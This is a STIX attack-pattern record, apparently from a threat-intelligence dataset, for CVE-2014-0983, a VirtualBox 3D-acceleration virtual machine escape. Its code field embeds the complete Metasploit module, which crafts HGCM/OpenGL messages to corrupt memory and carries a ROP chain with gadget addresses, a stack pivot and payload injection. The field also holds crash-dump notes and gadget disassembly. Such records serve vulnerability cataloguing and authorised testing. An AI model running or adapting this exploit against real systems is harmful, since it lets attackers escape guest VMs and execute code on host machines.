{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95a18629-80cd-496c-80fb-4e292fa2c365",
    "created": "2024-08-14T16:50:11.066472Z",
    "modified": "2024-08-14T16:50:11.066476Z",
    "name": "VirtualBox 3D Acceleration Virtual Machine Escape",
    "description": " This module exploits a vulnerability in the 3D Acceleration support for VirtualBox. The vulnerability exists in the remote rendering of OpenGL-based 3D graphics. By sending a sequence of specially crafted rendering messages, a virtual machine can exploit an out of bounds array access to corrupt memory and escape to the host. This module has been tested successfully on Windows 7 SP1 (64 bits) as Host running Virtual Box 4.3.6.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/virtual_box_opengl_escape.rb",
            "external_id": "virtual_box_opengl_escape.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0983"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/advisories/oracle-virtualbox-3d-acceleration-multiple-memory-corruption-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=oracle_virtualbox_3d_acceleration"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  DEVICE = '\\\\\\\\.\\\\VBoxGuest'\n  INVALID_HANDLE_VALUE = 0xFFFFFFFF\n\n  # VBOX HGCM protocol constants\n  VBOXGUEST_IOCTL_HGCM_CONNECT = 2269248\n  VBOXGUEST_IOCTL_HGCM_DISCONNECT = 2269252\n  VBOXGUEST_IOCTL_HGCM_CALL = 2269256\n  CONNECT_MSG_SIZE = 140\n  DISCONNECT_MSG_SIZE = 8\n  SET_VERSION_MSG_SIZE = 40\n  SET_PID_MSG_SIZE = 28\n  CALL_EA_MSG_SIZE = 40\n  VERR_WRONG_ORDER = 0xffffffea\n  SHCRGL_GUEST_FN_SET_PID = 12\n  SHCRGL_CPARMS_SET_PID = 1\n  SHCRGL_GUEST_FN_SET_VERSION = 6\n  SHCRGL_CPARMS_SET_VERSION = 2\n  SHCRGL_GUEST_FN_INJECT = 9\n  SHCRGL_CPARMS_INJECT = 2\n  CR_PROTOCOL_VERSION_MAJOR = 9\n  CR_PROTOCOL_VERSION_MINOR = 1\n  VMM_DEV_HGCM_PARM_TYPE_32_BIT = 1\n  VMM_DEV_HGCM_PARM_TYPE_64_BIT = 2\n  VMM_DEV_HGCM_PARM_TYPE_LIN_ADDR = 5\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VirtualBox 3D Acceleration Virtual Machine Escape',\n          'Description' => %q{\n            This module exploits a vulnerability in the 3D Acceleration support for VirtualBox. The\n            vulnerability exists in the remote rendering of OpenGL-based 3D graphics. By sending a\n            sequence of specially crafted rendering messages, a virtual machine can exploit an out\n            of bounds array access to corrupt memory and escape to the host. This module has been\n            tested successfully on Windows 7 SP1 (64 bits) as Host running Virtual Box 4.3.6.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Francisco Falcon', # Vulnerability Discovery and PoC\n            'Florian Ledoux', # Win 8 64 bits exploitation analysis\n            'juan vazquez' # MSF module\n          ],\n          'Arch' => ARCH_X64,\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [\n              'VirtualBox 4.3.6 / Windows 7 SP1 / 64 bits (ASLR/DEP bypass)',\n              {\n                :messages => :target_virtualbox_436_win7_64\n              }\n            ]\n          ],\n          'Payload' => {\n            'Space' => 7000,\n            'DisableNops' => true\n          },\n          'References' => [\n            ['CVE', '2014-0983'],\n            ['BID', '66133'],\n            ['URL', 'http://www.coresecurity.com/advisories/oracle-virtualbox-3d-acceleration-multiple-memory-corruption-vulnerabilities'],\n            ['URL', 'http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=oracle_virtualbox_3d_acceleration']\n          ],\n          'DisclosureDate' => '2014-03-11',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_getpid\n                stdapi_sys_process_memory_allocate\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def open_device\n    r = session.railgun.kernel32.CreateFileA(DEVICE, \"GENERIC_READ | GENERIC_WRITE\", 0, nil, \"OPEN_EXISTING\", \"FILE_ATTRIBUTE_NORMAL\", 0)\n\n    handle = r['return']\n\n    if handle == INVALID_HANDLE_VALUE\n      return nil\n    end\n\n    return handle\n  end\n\n  def send_ioctl(ioctl, msg)\n    result = session.railgun.kernel32.DeviceIoControl(@handle, ioctl, msg, msg.length, msg.length, msg.length, 4, \"\")\n\n    if result[\"GetLastError\"] != 0\n      unless result[\"ErrorMessage\"].blank?\n        vprint_error(\"#{result[\"ErrorMessage\"]}\")\n      end\n      return nil\n    end\n\n    unless result[\"lpBytesReturned\"] && result[\"lpBytesReturned\"] == msg.length\n      unless result[\"ErrorMessage\"].blank?\n        vprint_error(\"#{result[\"ErrorMessage\"]}\")\n      end\n      return nil\n    end\n\n    unless result[\"lpOutBuffer\"] && result[\"lpOutBuffer\"].unpack(\"V\").first == 0\n      unless result[\"ErrorMessage\"].blank?\n        vprint_error(\"#{result[\"ErrorMessage\"]}\")\n      end\n      return nil\n    end\n\n    result\n  end\n\n  def connect\n    msg = \"\\x00\" * CONNECT_MSG_SIZE\n\n    msg[4, 4] = [2].pack(\"V\")\n    msg[8, \"VBoxSharedCrOpenGL\".length] = \"VBoxSharedCrOpenGL\"\n\n    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CONNECT, msg)\n\n    if result.nil?\n      return result\n    end\n\n    client_id = result[\"lpOutBuffer\"][136, 4].unpack(\"V\").first\n\n    client_id\n  end\n\n  def disconnect\n    msg = \"\\x00\" * DISCONNECT_MSG_SIZE\n\n    msg[4, 4] = [@client_id].pack(\"V\")\n\n    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_DISCONNECT, msg)\n\n    result\n  end\n\n  def set_pid(pid)\n    msg = \"\\x00\" * SET_PID_MSG_SIZE\n\n    msg[0, 4] = [VERR_WRONG_ORDER].pack(\"V\")\n    msg[4, 4] = [@client_id].pack(\"V\") # u32ClientID\n    msg[8, 4] = [SHCRGL_GUEST_FN_SET_PID].pack(\"V\")\n    msg[12, 4] = [SHCRGL_CPARMS_SET_PID].pack(\"V\")\n    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_64_BIT].pack(\"V\")\n    msg[20, 4] = [pid].pack(\"V\")\n\n    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)\n\n    result\n  end\n\n  def set_version\n    msg = \"\\x00\" * SET_VERSION_MSG_SIZE\n\n    msg[0, 4] = [VERR_WRONG_ORDER].pack(\"V\")\n    msg[4, 4] = [@client_id].pack(\"V\") # u32ClientID\n    msg[8, 4] = [SHCRGL_GUEST_FN_SET_VERSION].pack(\"V\")\n    msg[12, 4] = [SHCRGL_CPARMS_SET_VERSION].pack(\"V\")\n    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")\n    msg[20, 4] = [CR_PROTOCOL_VERSION_MAJOR].pack(\"V\")\n    msg[28, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")\n    msg[32, 4] = [CR_PROTOCOL_VERSION_MINOR].pack(\"V\")\n\n    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)\n\n    result\n  end\n\n  def trigger(buff_addr, buff_length)\n    msg = \"\\x00\" * CALL_EA_MSG_SIZE\n\n    msg[4, 4] = [@client_id].pack(\"V\")  # u32ClientID\n    msg[8, 4] = [SHCRGL_GUEST_FN_INJECT].pack(\"V\")\n    msg[12, 4] = [SHCRGL_CPARMS_INJECT].pack(\"V\")\n    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")\n    msg[20, 4] = [@client_id].pack(\"V\") # u32ClientID\n    msg[28, 4] = [VMM_DEV_HGCM_PARM_TYPE_LIN_ADDR].pack(\"V\")\n    msg[32, 4] = [buff_length].pack(\"V\") # size_of(buf)\n    msg[36, 4] = [buff_addr].pack(\"V\") # (buf)\n\n    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)\n\n    result\n  end\n\n  def stack_adjustment\n    pivot = \"\\x65\\x8b\\x04\\x25\\x10\\x00\\x00\\x00\"  # \"mov eax,dword ptr gs:[10h]\" # Get Stack Bottom from TEB\n    pivot << \"\\x89\\xc4\"                         # mov esp, eax                 # Store stack bottom in esp\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\"         # add esp, -2000               # Plus a little offset...\n\n    pivot\n  end\n\n  def target_virtualbox_436_win7_64(message_id)\n    opcodes = [0xFF, 0xea, 0x02, 0xf7]\n\n    opcodes_hdr = [\n      0x77474c01,    # type CR_MESSAGE_OPCODES\n      0x8899,        # conn_id\n      opcodes.length # numOpcodes\n    ]\n\n    if message_id == 2\n      # Message used to achieve Code execution\n      # See at the end of the module for a better description of the ROP Chain,\n      # or even better, read: http://www.vupen.com/blog/20140725.Advanced_Exploitation_VirtualBox_VM_Escape.php\n      # All gadgets from VBoxREM.dll\n      opcodes_data = [0x8, 0x30, 0x331].pack(\"V*\")\n\n      opcodes_data << [0x6a68599a].pack(\"Q<\") # Gadget 2 # pop rdx # xor ecx,dword ptr [rax] # add cl,cl # movzx eax,al # ret\n      opcodes_data << [112].pack(\"Q<\") # RDX\n      opcodes_data << [0x6a70a560].pack(\"Q<\") # Gadget 3 # lea rax,[rsp+8] # ret\n      opcodes_data << [0x6a692b1c].pack(\"Q<\") # Gadget 4 # lea rax,[rdx+rax] # ret\n      opcodes_data << [0x6a6931d6].pack(\"Q<\") # Gadget 5 # add dword ptr [rax],eax # add cl,cl # ret\n      opcodes_data << [0x6a68124e].pack(\"Q<\") # Gadget 6 # pop r12 # ret\n      opcodes_data << [0x6A70E822].pack(\"Q<\") # R12 := ptr to .data in VBoxREM.dll (4th argument lpflOldProtect)\n      opcodes_data << [0x6a70927d].pack(\"Q<\") # Gadget 8 # mov r9,r12 # mov r8d,dword ptr [rsp+8Ch] # mov rdx,qword ptr [rsp+68h] # mov rdx,qword ptr [rsp+68h] # call rbp\n      opcodes_data << Rex::Text.pattern_create(80)\n      opcodes_data << [0].pack(\"Q<\")          # 1st arg (lpAddress) # chain will store stack address here\n      opcodes_data << Rex::Text.pattern_create(104 - 80 - 8)\n      opcodes_data << [0x2000].pack(\"Q<\")     # 2nd arg (dwSize)\n      opcodes_data << Rex::Text.pattern_create(140 - 104 - 8)\n      opcodes_data << [0x40].pack(\"V\")        # 3rd arg (flNewProtect)\n      opcodes_data << Rex::Text.pattern_create(252 - 4 - 140 - 64)\n      opcodes_data << [0x6A70BB20].pack(\"V\")  # ptr to jmp VirtualProtect instr.\n      opcodes_data << \"A\" * 8\n      opcodes_data << [0x6a70a560].pack(\"Q<\") # Gadget 9\n      opcodes_data << [0x6a6c9d3d].pack(\"Q<\") # Gadget 10\n      opcodes_data << \"\\xe9\\x5b\\x02\\x00\\x00\"  # jmp $+608\n      opcodes_data << \"A\" * (624 - 24 - 5)\n      opcodes_data << [0x6a682a2a].pack(\"Q<\") # Gadget 1 # xchg eax, esp # ret # stack pivot\n      opcodes_data << stack_adjustment\n      opcodes_data << payload.encoded\n      opcodes_data << Rex::Text.pattern_create(8196 - opcodes_data.length)\n    else\n      # Message used to corrupt head_spu\n      # 0x2a9 => offset to head_spu in VBoxSharedCrOpenGL.dll .data\n      # 8196 => On my tests, this data size allows to keep the memory\n      # not reused until the second packet arrives. The second packet,\n      # of course, must have 8196 bytes length too. So this memory is\n      # reused and code execution can be accomplished.\n      opcodes_data = [0x8, 0x30, 0x331, 0x2a9].pack(\"V*\")\n      opcodes_data << \"B\" * (8196 - opcodes_data.length)\n    end\n\n    msg = opcodes_hdr.pack(\"V*\") + opcodes.pack(\"C*\") + opcodes_data\n\n    msg\n  end\n\n  def send_opcodes_msg(process, message_id)\n    msg = self.send(target[:messages], message_id)\n\n    mem = process.memory.allocate(msg.length + (msg.length % 1024))\n\n    process.memory.write(mem, msg)\n\n    trigger(mem, msg.length)\n  end\n\n  def check\n    handle = open_device\n    if handle.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    unless self.respond_to?(target[:messages])\n      print_error(\"Invalid target specified: no messages callback function defined\")\n      return\n    end\n\n    print_status(\"Opening device...\")\n    @handle = open_device\n    if @handle.nil?\n      fail_with(Failure::NoTarget, \"#{DEVICE} device not found\")\n    else\n      print_good(\"#{DEVICE} found, exploiting...\")\n    end\n\n    print_status(\"Connecting to the service...\")\n    @client_id = connect\n    if @client_id.nil?\n      fail_with(Failure::Unknown, \"Connect operation failed\")\n    end\n\n    print_good(\"Client ID #{@client_id}\")\n\n    print_status(\"Calling SET_VERSION...\")\n    result = set_version\n    if result.nil?\n      fail_with(Failure::Unknown, \"Failed to SET_VERSION\")\n    end\n\n    this_pid = session.sys.process.getpid\n    print_status(\"Calling SET_PID...\")\n    result = set_pid(this_pid)\n    if result.nil?\n      fail_with(Failure::Unknown, \"Failed to SET_PID\")\n    end\n\n    this_proc = session.sys.process.open\n    print_status(\"Sending First 0xEA Opcode Message to control head_spu...\")\n    result = send_opcodes_msg(this_proc, 1)\n    if result.nil?\n      fail_with(Failure::Unknown, \"Failed to control heap_spu...\")\n    end\n\n    print_status(\"Sending Second 0xEA Opcode Message to execute payload...\")\n    @old_timeout = session.response_timeout\n    session.response_timeout = 5\n    begin\n      send_opcodes_msg(this_proc, 2)\n    rescue Rex::TimeoutError\n      vprint_status(\"Expected timeout in case of successful exploitation\")\n    end\n  end\n\n  def cleanup\n    unless @old_timeout.nil?\n      session.response_timeout = @old_timeout\n    end\n\n    if session_created?\n      # Unless we add CoE there is nothing to do\n      return\n    end\n\n    unless @client_id.nil?\n      print_status(\"Disconnecting from the service...\")\n      disconnect\n    end\n\n    unless @handle.nil?\n      print_status(\"Closing the device...\")\n      session.railgun.kernel32.CloseHandle(@handle)\n    end\n  end\nend\n\n=begin\n\n* VirtualBox 4.3.6 / Windows 7 SP1 64 bits\n\nCrash after second message:\n\n0:013> dd rax\n00000000`0e99bd44  41306141 61413161 33614132 41346141\n00000000`0e99bd54  61413561 37614136 41386141 62413961\n00000000`0e99bd64  31624130 41326241 62413362 35624134\n00000000`0e99bd74  41366241 62413762 39624138 41306341\n00000000`0e99bd84  63413163 33634132 41346341 63413563\n00000000`0e99bd94  37634136 41386341 64413963 31644130\n00000000`0e99bda4  41326441 64413364 35644134 41366441\n00000000`0e99bdb4  64413764 39644138 41306541 65413165\n0:013> r\nrax=000000000e99bd44 rbx=0000000000000001 rcx=000007fef131e8ba\nrdx=000000006a72fb62 rsi=000000000e5531f0 rdi=0000000000000000\nrip=000007fef12797f8 rsp=0000000004b5f620 rbp=0000000041424344 << already controlled...\n r8=0000000000000001  r9=00000000000005c0 r10=0000000000000000\nr11=0000000000000246 r12=0000000000000000 r13=00000000ffffffff\nr14=000007fef1f90000 r15=0000000002f6e280\niopl=0         nv up ei pl nz na po nc\ncs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206\nVBoxSharedCrOpenGL!crServerAddNewClient+0x208:\n000007fe`f12797f8 ff9070030000    call    qword ptr [rax+370h] ds:00000000`0e99c0b4=7641397541387541\n\nGadget 1: Stack Pivot # 0x6a682a2a\n\n xchg    eax,esp    94\n ret                c3\n\nGadget 2: Control RDX value # 0x6a68599a\n\n pop rdx                    5a\n xor ecx,dword ptr [rax]    33 08\n add cl,cl                  00 c9\n movzx eax,al               0f b6 c0\n ret                        c3\n\nGadget 3: Store ptr to RSP in RAX # 0x6a70a560\n\n lea rax,[rsp+8]            48 8d 44 24 08\n ret                        c3\n\nGadget 4: Store ptr to RSP + RDX offset (controlled) in RAX # 0x6a692b1c\n\n lea rax,[rdx+rax]          48 8d 04 02\n ret                        c3\n\nGadget 5: Write Stack Address (EAX) to the stack # 0x6a6931d6\n\n add dword ptr [rax],eax    01 00\n add cl,cl                  00 c9\n ret                        c3\n\nGadget 6: Control R12 # 0x6a68124e\n\npop r12\nret\n\nGadget 7: Recover VirtualProtect arguments from the stack and call it (ebp) # 0x6a70927d\n\n mov r9,r12                   4d 89 e1\n mov r8d,dword ptr [rsp+8Ch]  44 8b 84 24 8c 00 00 00\n mov rdx,qword ptr [rsp+68h]  48 8b 54 24 68\n mov rcx,qword ptr [rsp+50h]  48 8b 4c 24 50\n call rbp                     ff d5\n\nGadget 8: After VirtualProtect, get pointer to the shellcode in the # 0x6a70a560\n\n lea rax, [rsp+8]   48 8d 44 24 08\n ret                c3\n\n Gadget 9: Push the pointer and provide control to shellcode # 0x6a6c9d3d\n\n push rax   50\n adc cl,ch  10 e9\n ret        c3\n\n=end\n",
    "x_mitre_disclosure_date": "2014-03-11",
    "x_mitre_platforms": [
        "win'"
    ]
}